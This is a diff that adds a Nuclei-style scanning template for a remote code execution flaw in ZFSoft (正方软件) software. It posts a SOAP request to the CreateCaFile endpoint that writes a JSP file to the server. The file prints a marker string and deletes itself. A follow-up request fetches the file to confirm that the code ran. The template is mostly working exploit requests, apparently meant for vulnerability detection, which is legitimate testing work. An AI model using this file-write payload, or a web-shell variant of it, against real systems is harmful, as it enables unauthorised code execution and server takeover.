@@ -1,0 +1,60 @@
+id: zfsoft-createcafile-rce
+info:
+  name: zfsoft-createcafile-rce
+  author: apple
+  severity: critical
+  description: 正方软件RCE
+  reference:
+    - https://
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}" 
+
+
+http:
+  - raw:
+      - |-
+        POST /zfca/axis/CreateCaFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
+        Content-Length: 781
+        Content-Type: text/xml;charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:pub="http://pubService.webServices.zfca.zfsoft.com">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <pub:createFile soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                <filepath xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">{{filename}}.jsp</filepath>
+                <content xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
+        <![CDATA[
+        <% out.println("whoisceshi");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ]]>
+        </content>
+              </pub:createFile>
+          </soapenv:Body>
+        </soapenv:Envelope>
+      - |+
+        GET /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "macOS"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Priority: u=0, i
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whoisceshi'
